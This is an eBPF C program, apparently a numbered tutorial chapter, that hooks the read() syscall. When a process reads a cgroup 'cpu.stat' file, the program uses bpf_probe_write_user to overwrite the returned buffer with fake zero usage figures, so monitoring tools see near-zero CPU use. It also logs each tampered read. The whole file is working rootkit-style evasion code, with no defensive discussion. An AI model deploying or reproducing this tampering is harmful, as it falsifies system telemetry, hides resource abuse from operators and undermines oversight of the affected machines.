// Ch05 Cgroup Leash — intercept read() of cgroup "cpu.stat" files and
// rewrite the kernel-provided user buffer in-place to zero out usage_usec,
// making the controller appear to report near-zero CPU usage to watchers.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char comm[16];
    long orig_bytes;
    int patched;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// per-pid state: buffer pointer + flag if this read targets cpu.stat
struct rctx {
    unsigned long buf;
    unsigned int is_cpu_stat;
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned long);   // pid_tgid
    __type(value, struct rctx);
    __uint(max_entries, 10240);
} inflight SEC(".maps");

SEC("tp/syscalls/sys_enter_read")
int tp_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    unsigned long id = bpf_get_current_pid_tgid();
    int fd = (int)ctx->args[0];
    unsigned long buf = (unsigned long)ctx->args[1];

    // Walk current->files->fdt->fd[fd]->f_path.dentry->d_name.name
    struct task_struct *t = (struct task_struct *)bpf_get_current_task();
    struct files_struct *files = BPF_CORE_READ(t, files);
    if (!files) return 0;
    struct fdtable *fdt = BPF_CORE_READ(files, fdt);
    if (!fdt) return 0;
    unsigned int max_fds = BPF_CORE_READ(fdt, max_fds);
    if ((unsigned int)fd >= max_fds) return 0;
    struct file **farr = BPF_CORE_READ(fdt, fd);
    struct file *f = NULL;
    bpf_probe_read_kernel(&f, sizeof(f), &farr[fd]);
    if (!f) return 0;
    const unsigned char *name = BPF_CORE_READ(f, f_path.dentry, d_name.name);
    char nm[16] = {};
    bpf_probe_read_kernel_str(&nm, sizeof(nm), name);
    struct rctx r = { .buf = buf, .is_cpu_stat = 0 };
    if (nm[0]=='c' && nm[1]=='p' && nm[2]=='u' && nm[3]=='.' &&
        nm[4]=='s' && nm[5]=='t' && nm[6]=='a' && nm[7]=='t') {
        r.is_cpu_stat = 1;
    }
    bpf_map_update_elem(&inflight, &id, &r, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int tp_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    unsigned long id = bpf_get_current_pid_tgid();
    struct rctx *r = bpf_map_lookup_elem(&inflight, &id);
    if (!r) return 0;
    long ret = ctx->ret;
    int patched = 0;
    if (ret > 0 && r->is_cpu_stat) {
        // Overwrite the first chunk of the user buffer with benign text.
        // "usage_usec 0\nuser_usec 0\nsystem_usec 0\n" is 40 bytes — keep
        // it short so we don't overflow; the caller will see fewer bytes
        // of legitimate content followed by trailing original garbage,
        // but most parsers stop at newline or key match.
        static const char fake[] = "usage_usec 0\nuser_usec 0\nsystem_usec 0\n\0";
        long n = sizeof(fake) - 1;
        if (n > ret) n = ret;
        bpf_probe_write_user((void *)r->buf, fake, n);
        patched = 1;
    }
    if (r->is_cpu_stat) {
        struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->pid = id & 0xffffffff;
            e->tgid = id >> 32;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            e->orig_bytes = ret;
            e->patched = patched;
            bpf_ringbuf_submit(e, 0);
        }
    }
    bpf_map_delete_elem(&inflight, &id);
    return 0;
}
